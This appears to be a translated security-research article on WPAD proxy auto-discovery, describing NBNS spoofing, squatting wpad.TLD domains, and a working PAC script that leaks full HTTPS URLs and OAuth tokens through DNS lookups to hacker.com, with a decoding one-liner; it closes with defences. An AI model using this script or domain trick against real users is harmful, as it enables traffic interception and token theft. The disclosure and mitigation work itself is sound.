<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>WPAD: instruction manual</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hello! I'm Maxim Andreev, programmer for the backend of Mail.Ru Cloud. At the last Security Meetup, I shared the results of my research into the WPAD ...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>WPAD: instruction manual</h1><div class="post__text post__text-html js-mediator-article"><img src="https://habrastorage.org/files/a7e/79e/50e/a7e79e50ed6941778352918a5a194a2a.jpg"><br><br>  Hello!  I'm Maxim Andreev, programmer for the backend of Mail.Ru Cloud.  At the last <a href="http://habrahabr.ru/company/mailru/blog/253767/">Security Meetup,</a> I shared the results of my research into the WPAD proxy auto-configuration protocol.  For those who missed - today's post.  I will talk about what WPAD is, what it provides for exploitation from an attacker's point of view, and also show examples of how HTTPS traffic can be partially intercepted using this technology. <br><a name="habracut"></a><br><h1>  Little materiel </h1><br>  WPAD (Web Proxy Auto Discovery protocol) is used to find a PAC (Proxy Auto Config) file, which is a JavaScript with a description of the logic by which the browser will determine how to connect to the desired URL.  When making a request, the browser calls the FindProxyForURL function from the PAC file, transmits the URL and host to it, and as a result expects to know which proxy to access this address.  It looks like this: <br><br><pre><code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">FindProxyForURL</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">url, host</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (host == <span class="hljs-string"><span class="hljs-string">"mail.ru"</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"PROXY mp.example.com:8080"</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (host == <span class="hljs-string"><span class="hljs-string">"google.com"</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"PROXY gp.example.com:5050"</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"DIRECT"</span></span>; } }</code> </pre> <br>  In addition to FindProxyForURL, various auxiliary functions are available in the PAC script for more flexible settings.  With their help, you can, for example, specify that the browser should open the mail.ru site from one to two on Monday through% proxynameX%, and at another time through% proxynameY%.  The address of the PAC script can be specified in the browser proxy settings explicitly.  For example, in Firefox, this can be done in the settings item called ‚ÄúURL of automatic proxy service settings‚Äù.  However, the network administrator is unlikely to want to register settings for all browsers for each client manually.  Much more convenient to use for this WPAD. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <h1>  How does WPAD work? </h1><br>  First of all, WPAD tries to find the PAC script using the option from the DHCP server (however, this feature is almost not supported by browsers), then sends an HTTP request to <a href="">http: //wpad.%domain%/wpad.dat</a> and downloads the resulting file.  At the same time, the search for the wpad.dat file in different operating systems will take place differently. <br><br>  Suppose we learned from the DHCP settings that the domain name is msk.office.work.  Then Windows XP will try to find it on wpad.msk.office.work (it will be resolving the domain through DNS), and then just on wpad.office.work. <br><br><ol><li>  <a href="">http://wpad.msk.office.work/wpad.dat</a> (DNS) </li><li>  <a href="">http://wpad.office.work/wpad.dat</a> (DNS) </li></ol><br><img src="https://habrastorage.org/files/6af/e99/7d7/6afe997d7bb54069a3e93315dec83ed1.png"><br>  <sup>Requests that makes Windows XP</sup> <br><br>  Windows 7 behaves differently: first, the DNS checks the full domain, then tries to resolve the WPAD name via the Link-Local Multicast Name Resolution, and then using the NetBIOS Name Service.  The latter two are broadcast protocols, and LLMNR is supported only by Windows, starting with Vista. <br><br><ol><li>  <a href="">http://wpad.msk.office.work/wpad.dat</a> (DNS) </li><li>  <a href="">http: //wpad/wpad.dat</a> (LLMNR) </li><li>  <a href="">http: //wpad/wpad.dat</a> (NBNS) </li></ol><br><img src="https://habrastorage.org/files/c68/92f/5fc/c6892f5fc53545a4a7e20b21fa3b1ca3.png"><br>  <sup>Requests that makes Windows 7</sup> <br><br><h1>  LAN use </h1><br>  Imagine yourself in the place of an intruder who wants to send all local traffic through his proxy server.  If we are in the same LAN segment (i.e., we can use NetBIOS), we don‚Äôt even have to do anything - you can use the ready NBNS-spoofer from Metasploit. <br><br><img src="https://habrastorage.org/files/659/b09/ae5/659b09ae56a542daac934dde29aef781.png"><br><br><img src="https://habrastorage.org/files/f03/888/20a/f0388820afa04f13854fe1fb2d484259.png"><br>  <sup>Implementation of NBNS-spoofing in the local network</sup> <br><br>  If we are on a different subnet, but we have a WINS server on our network, we can raise a Windows host named WPAD so that WINS can spread information about us.  This case is quite working: when testing in a fairly large local network of one university, requests from hundreds of different IPs began to come to a host that is even less than 24 in the network. <br><br><h1>  Internet use </h1><br>  Currently there are 861 first level domains.  In addition to the usual .com, .net, .ru, .org, among them there are more exotic - from .work and .school to .ninja and .vodka.  The names of these domains may well be spelled out in the option domain-name DHCP servers.  Thus, if the domain domain is specified in the domain-name, and we register the wpad.university domain, then all requests for the WPAD-file will get to us.  Moreover, if you look at the wpad.TLD domains of the first level, we will see the following picture: <br><br><img src="https://habrastorage.org/files/28f/318/9ba/28f3189ba194471997a34af0cdd8f9d6.png"><br>  <sup>WPAD Domains Free for Registration</sup> <br><br>  A couple of years ago, I registered the wpad.co domain, to which numerous requests for a wpad.dat file actually went.  But there is also more recent evidence of the possibility of intercepting what was not meant for us: a month ago I registered the wpad.work domain.  For 11 days he was approached from 3901 unique IP.  It is noticeable that the number of requests decreased at the weekend. <br><br><img src="https://habrastorage.org/files/c93/245/56a/c9324556a8ae4c2cad46afc9975bcbf4.png"><br>  <sup>The number of calls to wpad.work: the dynamics of the days of the week</sup> <br>  What can be found in the logs, if you send all sufferers through your proxy, you can see below. <br><br><img src="https://habrastorage.org/files/e42/f6f/dc9/e42f6fdc90b84f19a68958fdcc22195e.png"><br>  <sup>Fragment of the proxy log</sup> <br><br><h1>  Profit? </h1><br>  So, we forced users to go through the proxy server controlled by us.  What does this give us?  In the case of HTTP requests, full control over the traffic: the headers and body of the request and response, all parameters, cookies, data submit forms. <br><br><img src="https://habrastorage.org/files/6e5/b05/eeb/6e5b05eebf084bf0aa2f923d0855fa3a.png"><br>  <sup>HTTP request via proxy server</sup> <br><br>  In the case of HTTPS, we will see only the CONNECT method.  The maximum information available to us is the host and user-agent.  Unfortunately, the most interesting thing, that is, the data exchange between the client and the server after the handshake, will look to us only as a set of binary data. <br><br><img src="https://habrastorage.org/files/692/15b/602/69215b6022184a1f926284e07e61f429.png"><br>  <sup>HTTPS request via proxy server</sup> <br><br><h1>  Back to PAC </h1><br>  Despite the fact that the PAC script is written in JavaScript, the window and document objects are not available in it, it will not be possible for the user to output an alert (it will be displayed only in the browser logs).  However, even this stripped down version has its nice features. <br><br><img src="https://habrastorage.org/files/671/48a/395/67148a395ab34e68b4f2b03346f31730.png"><br>  <sup>JavaScript functions available from the PAC script</sup> <br><br>  One of them, isResolvable, checks if it is possible to resolve a domain name to an IP address.  It works like this: <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (isResolvable(host)) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"PROXY proxy1.example.com:8080"</span></span>;</code> </pre><br>  What can we get from using this feature?  To answer this question, we first understand what exactly is passed to the FindProxyForURL function in the ‚ÄúURL‚Äù argument.  It turns out that it depends on the browser: Chrome sends the scheme, host, request (GET-parameters), but Firefox in addition also a fragment (location.hash). <br><br>  For example, the URL <a href="http://mail.ru/%3Fa%3D123">http://mail.ru/?a=123#token=secret will be</a> processed as follows: <br><br>  <b>Chrome</b> <br><br><img src="https://habrastorage.org/files/19d/200/8f8/19d2008f832e4d54af72073a3ddacf52.png"><br><br>  <b>Firefox</b> <br><br><img src="https://habrastorage.org/files/f90/ea6/d03/f90ea6d034384c0cbf3d1874d3b070f3.png"><br><br>  No matter which browser is used, we have a full URL.  With this you can already work.  Let's try, using isResolvable, to intercept the URL.  We encode the URL in such a way that it is a valid host name, and append .hacker.com, in the NS-records of which the DNS server is registered, where we respond to all requests and log them. <br><br>  So, with the help of simple transformations: <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">encode</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">str</span></span></span><span class="hljs-function">) </span></span>{ r = str.toLowerCase() .replace(<span class="hljs-regexp"><span class="hljs-regexp">/([^a-z1-9])/g</span></span>, <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">m</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> <span class="hljs-string"><span class="hljs-string">"0"</span></span> + m.charCodeAt(<span class="hljs-number"><span class="hljs-number">0</span></span>) }) .replace(<span class="hljs-regexp"><span class="hljs-regexp">/([^\.]{60})(.)/g</span></span>, <span class="hljs-string"><span class="hljs-string">'$1.$2'</span></span>) .substr(<span class="hljs-number"><span class="hljs-number">0</span></span>, <span class="hljs-number"><span class="hljs-number">240</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> r + (r.slice(<span class="hljs-number"><span class="hljs-number">-1</span></span>) != <span class="hljs-string"><span class="hljs-string">"."</span></span> ? <span class="hljs-string"><span class="hljs-string">"."</span></span> : <span class="hljs-string"><span class="hljs-string">""</span></span>) + <span class="hljs-string"><span class="hljs-string">"hacker.com"</span></span>; } <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">FindProxyForURL</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">url, host</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">var</span></span> u = encode(url); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> isResolvable(u) ? <span class="hljs-string"><span class="hljs-string">"DIRECT"</span></span> : <span class="hljs-string"><span class="hljs-string">"DIRECT"</span></span>; }</code> </pre><br>  our test URL <a href="https://example.ru/%3Ftoken%3D123">https://example.ru/?token=123</a> turns into an elegant <br>  <b>https058047047example046ru047063token061123.hacker.com</b> , from which, by means of Perl-conversion <br><br><pre> <code class="bash hljs"><span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> <span class="hljs-string"><span class="hljs-string">'https058047047example046ru047063token061123.hacker.com'</span></span> \ | perl -lape <span class="hljs-string"><span class="hljs-string">'s/\.hacker\.com$//; s/\.//g; s/0(..)/chr($1)/eg;'</span></span></code> </pre><br>  You can easily get the source string, that is, the full URL of the HTTPS request.  Thus, using the wrong client configuration, an attacker can partially bypass HTTPS encryption and get access to the URLs of all user requests. <br><br>  It's no secret that in the URL fragment (location.hash), OAuth tokens are often transmitted.  Thus, in the case of using Firefox, they can get into our hands. <br><br>  As a result of placing this script on wpad.work, several thousand user requests were intercepted, among them the most popular protocols were: <br><br><ol><li>  53% HTTPS </li><li>  46% HTTP </li><li>  0.15% WS </li><li>  0.08% WSS </li></ol><br><br>  The most common requests came from the following countries: <br><br><ol><li>  14% Russia </li><li>  11% United States </li><li>  9% China </li><li>  7% India </li></ol><br><h1>  Total </h1><br>  With WPAD, you can, despite HTTPS, intercept local traffic, OAuth tokens, and other information from a URL.  However, we as honest people will not do this.  It is better to try, using the knowledge we have, to defend against potential attacks.  Below are the main recommendations, the implementation of which will allow you to secure your traffic. <br><br><ol><li>  <i>Do not use "foreign" domains</i> .  Usually it is advised to use .local in the absence of your domain, but I would not recommend it, since an attacker can make an attack through broadcast-resolvers that use the same domain - in particular, Bonjour.  Optimal use of the registered domain name (it is not necessary to make it resolvable outside). </li><li>  <i>Reserve wpad addresses in domain zones</i> . </li><li>  <i>Disable automatic detection of settings in the settings of all browsers</i> (for IE and Chrome, this can be done via domain policies). </li></ol><br>  PS If you want to take part in one of the following Security Meetings, and you have something to tell, write to Karim <a href="https://habrahabr.ru/users/valievkarim/" class="user_link">valievkarim</a> Valiev or Vladimir <a href="https://habrahabr.ru/users/z3apa3a/" class="user_link">z3apa3a</a> Dubrovin. </div><p>Source: <a href="https://habr.com/ru/post/259521/">https://habr.com/ru/post/259521/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../259511/index.html">On the electronic document flow in Russia, its cheerful parochial features and the situation in general</a></li>
<li><a href="../259513/index.html">One day in the village. Skolkovo Startup Village</a></li>
<li><a href="../259515/index.html">Salt and Ansible - Python configuration management systems - video from DevConf 2014</a></li>
<li><a href="../259517/index.html">How to programmer to make money on the stock market, thinking only about the code: StockSharp and ITinvest competition</a></li>
<li><a href="../259519/index.html">Short note: 2 zabbix servers one client</a></li>
<li><a href="../259523/index.html">Why Doctrine ORM is Bad for PHP</a></li>
<li><a href="../259527/index.html">"Boss, write an application for us." Requires software developer and hardware for DJI drones</a></li>
<li><a href="../259529/index.html">Real Associative Arrays in JavaScript</a></li>
<li><a href="../259531/index.html">What you need to know when migrating from MySQL to PostgreSQL?</a></li>
<li><a href="../259533/index.html">Automated QA System: a headache pill for testers using the Star Crusade game as an example</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>